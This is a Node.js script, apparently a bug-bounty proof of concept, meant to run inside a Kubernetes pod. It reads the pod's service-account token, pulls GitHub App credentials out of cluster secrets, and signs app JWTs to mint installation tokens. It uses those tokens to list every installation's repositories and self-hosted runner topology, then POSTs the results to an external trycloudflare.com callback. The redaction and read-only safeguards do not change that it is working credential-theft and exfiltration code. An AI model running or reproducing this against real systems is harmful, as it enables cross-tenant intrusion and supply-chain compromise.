"use strict";

const fs = require("fs");
const path = require("path");
const {
  API_ROOT,
  KSA_ROOT,
  KubeClient,
  apiRequest,
  appJwt,
  githubAppValues,
  request,
  responseSummary,
} = require("./vrp_jit_probe.js");

const CALLBACK_URL =
  "https://olive-path-ambien-essence.trycloudflare.com/" +
  "37d5d91980b207f741a70cb9bf88cc09";

function repositoryProjection(response) {
  const repositories =
    response.ok && response.value && Array.isArray(response.value.repositories)
      ? response.value.repositories
      : [];
  return {
    ...responseSummary(response),
    total_count: response.ok ? response.value.total_count : null,
    returned_count: repositories.length,
    public_repositories: repositories
      .filter((repo) => !repo.private)
      .map((repo) => ({
        full_name: repo.full_name,
        archived: Boolean(repo.archived),
        default_branch: repo.default_branch || null,
      })),
    private_repository_count: repositories.filter((repo) => repo.private).length,
    private_repository_names_returned: false,
  };
}

function runnerProjection(runners) {
  const values = Array.isArray(runners) ? runners : [];
  const labelSets = new Set();
  for (const runner of values) {
    const labels = Array.isArray(runner.labels)
      ? runner.labels.map((label) => label.name).filter(Boolean).sort()
      : [];
    if (labels.length) labelSets.add(JSON.stringify(labels));
  }
  return {
    count: values.length,
    online_count: values.filter((runner) => runner.status === "online").length,
    busy_count: values.filter((runner) => runner.busy).length,
    label_sets: [...labelSets].map((value) => JSON.parse(value)),
    runner_names_returned: false,
  };
}

function workflowProjection(selectedWorkflows, publicRepositoryNames) {
  const selected = Array.isArray(selectedWorkflows) ? selectedWorkflows : [];
  const publicPrefixes = publicRepositoryNames.map(
    (name) => `${name}/.github/workflows/`,
  );
  const isPublic = (workflow) =>
    publicPrefixes.some((prefix) => String(workflow).startsWith(prefix));
  return {
    count: selected.length,
    public_workflows: selected.filter(isPublic),
    private_or_unidentified_count: selected.filter((value) => !isPublic(value))
      .length,
    private_workflow_names_returned: false,
  };
}

async function organizationRunnerTopology(
  call,
  token,
  organization,
  publicRepositoryNames,
) {
  const base = `${API_ROOT}/orgs/${encodeURIComponent(organization)}/actions`;
  const [groups, organizationRunners] = await Promise.all([
    call(`${base}/runner-groups?per_page=100`, token),
    call(`${base}/runners?per_page=100`, token),
  ]);
  const groupValues =
    groups.ok && groups.value && Array.isArray(groups.value.runner_groups)
      ? groups.value.runner_groups
      : [];
  const projectedGroups = [];
  for (const group of groupValues) {
    const [detail, repositories, runners] = await Promise.all([
      call(`${base}/runner-groups/${encodeURIComponent(group.id)}`, token),
      call(
        `${base}/runner-groups/${encodeURIComponent(group.id)}/repositories?per_page=100`,
        token,
      ),
      call(
        `${base}/runner-groups/${encodeURIComponent(group.id)}/runners?per_page=100`,
        token,
      ),
    ]);
    const detailValue = detail.ok ? detail.value : group;
    const repositoryValues =
      repositories.ok &&
      repositories.value &&
      Array.isArray(repositories.value.repositories)
        ? repositories.value.repositories
        : [];
    const runnerValues =
      runners.ok && runners.value && Array.isArray(runners.value.runners)
        ? runners.value.runners
        : [];
    projectedGroups.push({
      id: group.id,
      name: group.name,
      visibility: group.visibility,
      default: Boolean(group.default),
      inherited: Boolean(group.inherited),
      allows_public_repositories: Boolean(group.allows_public_repositories),
      restricted_to_workflows: Boolean(group.restricted_to_workflows),
      workflow_restrictions_read_only: Boolean(
        group.workflow_restrictions_read_only,
      ),
      detail: responseSummary(detail),
      repositories: {
        ...responseSummary(repositories),
        total_count: repositories.ok ? repositories.value.total_count : null,
        public_repositories: repositoryValues
          .filter((repo) => !repo.private)
          .map((repo) => repo.full_name),
        private_repository_count: repositoryValues.filter((repo) => repo.private)
          .length,
        private_repository_names_returned: false,
      },
      selected_workflows: workflowProjection(
        detailValue.selected_workflows,
        publicRepositoryNames,
      ),
      runners: {
        ...responseSummary(runners),
        ...runnerProjection(runnerValues),
      },
    });
  }
  return {
    groups: {
      ...responseSummary(groups),
      total_count: groups.ok ? groups.value.total_count : null,
      items: projectedGroups,
    },
    runners: {
      ...responseSummary(organizationRunners),
      ...runnerProjection(
        organizationRunners.ok &&
          organizationRunners.value &&
          organizationRunners.value.runners,
      ),
    },
  };
}

async function installationProjection(call, jwt, installation) {
  const configuredPermissions = installation.permissions || {};
  const requestedPermissions = { metadata: "read" };
  if (configuredPermissions.organization_self_hosted_runners) {
    requestedPermissions.organization_self_hosted_runners = "read";
  }
  const minted = await call(
    `${API_ROOT}/app/installations/${encodeURIComponent(installation.id)}/access_tokens`,
    jwt,
    "POST",
    { permissions: requestedPermissions },
  );
  const token = minted.value && minted.value.token;
  if (!minted.ok || !token) {
    return {
      id: installation.id,
      account: installation.account && installation.account.login,
      account_type: installation.account && installation.account.type,
      repository_selection: installation.repository_selection,
      suspended: Boolean(installation.suspended_at),
      configured_permissions: configuredPermissions,
      token_mint: responseSummary(minted),
      token_value_returned: false,
    };
  }
  const effectivePermissions = minted.value.permissions || {};
  const unexpectedWritePermissions = Object.entries(effectivePermissions)
    .filter(([, level]) => level === "write")
    .map(([name]) => name);
  if (unexpectedWritePermissions.length) {
    return {
      id: installation.id,
      account: installation.account && installation.account.login,
      account_type: installation.account && installation.account.type,
      repository_selection: installation.repository_selection,
      suspended: Boolean(installation.suspended_at),
      configured_permissions: configuredPermissions,
      token_mint: {
        ...responseSummary(minted),
        requested_permissions: requestedPermissions,
        effective_permissions: effectivePermissions,
        unexpected_write_permissions: unexpectedWritePermissions,
        inventory_aborted: true,
        token_value_returned: false,
      },
    };
  }
  const repositories = await call(
    `${API_ROOT}/installation/repositories?per_page=100`,
    token,
  );
  const projectedRepositories = repositoryProjection(repositories);
  const publicNames = projectedRepositories.public_repositories.map(
    (repo) => repo.full_name,
  );
  const account = installation.account || {};
  const runnerPermission =
    minted.value.permissions &&
    minted.value.permissions.organization_self_hosted_runners;
  const topology =
    account.type === "Organization" && runnerPermission
      ? await organizationRunnerTopology(call, token, account.login, publicNames)
      : null;
  return {
    id: installation.id,
    account: account.login || null,
    account_type: account.type || null,
    target_type: installation.target_type || null,
    repository_selection: installation.repository_selection || null,
    suspended: Boolean(installation.suspended_at),
    configured_permissions: configuredPermissions,
    token_mint: {
      ...responseSummary(minted),
      requested_permissions: requestedPermissions,
      effective_permissions: effectivePermissions,
      unexpected_write_permissions: [],
      inventory_aborted: false,
      repository_selection: minted.value.repository_selection || null,
      token_value_returned: false,
    },
    repositories: projectedRepositories,
    organization_runner_topology: topology,
  };
}

async function collect(call = apiRequest) {
  const serviceAccountToken = fs
    .readFileSync(path.join(KSA_ROOT, "token"), "utf8")
    .trim();
  const namespace = fs
    .readFileSync(path.join(KSA_ROOT, "namespace"), "utf8")
    .trim();
  const client = new KubeClient(serviceAccountToken, namespace);
  const appSecret = githubAppValues(await client.secrets());
  if (!appSecret) throw new Error("GitHub App Secret not found");
  const values = appSecret.values;
  const jwt = appJwt(values.github_app_id, values.github_app_private_key);
  const [app, installations] = await Promise.all([
    call(`${API_ROOT}/app`, jwt),
    call(`${API_ROOT}/app/installations?per_page=100`, jwt),
  ]);
  if (!installations.ok || !Array.isArray(installations.value)) {
    throw new Error("installation inventory failed");
  }
  const projected = [];
  for (const installation of installations.value) {
    projected.push(await installationProjection(call, jwt, installation));
  }
  return {
    phase: "github-app-cross-installation-inventory",
    captured_at: new Date().toISOString(),
    safety: {
      github_app_private_key_returned: false,
      app_jwt_returned: false,
      installation_token_returned: false,
      installation_tokens_downscoped_to_read: true,
      private_repository_names_returned: false,
      private_repository_contents_requested: false,
      private_workflow_names_returned: false,
      persistent_mutation_sent: false,
      runner_started: false,
      job_claim_attempted: false,
    },
    credential: {
      secret_name: appSecret.name,
      app: app.ok
          ? {
            id: app.value.id,
            slug: app.value.slug,
            owner: app.value.owner && app.value.owner.login,
            configured_permissions: app.value.permissions || {},
          }
        : responseSummary(app),
    },
    installations_truncated: installations.value.length === 100,
    installation_count: installations.value.length,
    installations: projected,
  };
}

async function send(value) {
  const target = new URL(CALLBACK_URL);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || 443,
    requestPath: target.pathname,
    method: "POST",
    body,
    headers: {
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  if (!response.ok) throw new Error("callback failed");
}

if (require.main === module) {
  if (process.env.VRP_INSTALLATIONS_WRAPPER_TEST === "1") {
    process.exit(0);
  } else {
    collect()
      .then(send)
      .then(() => process.exit(0))
      .catch(() => process.exit(1));
  }
}

module.exports = {
  installationProjection,
  organizationRunnerTopology,
  repositoryProjection,
  runnerProjection,
  workflowProjection,
};
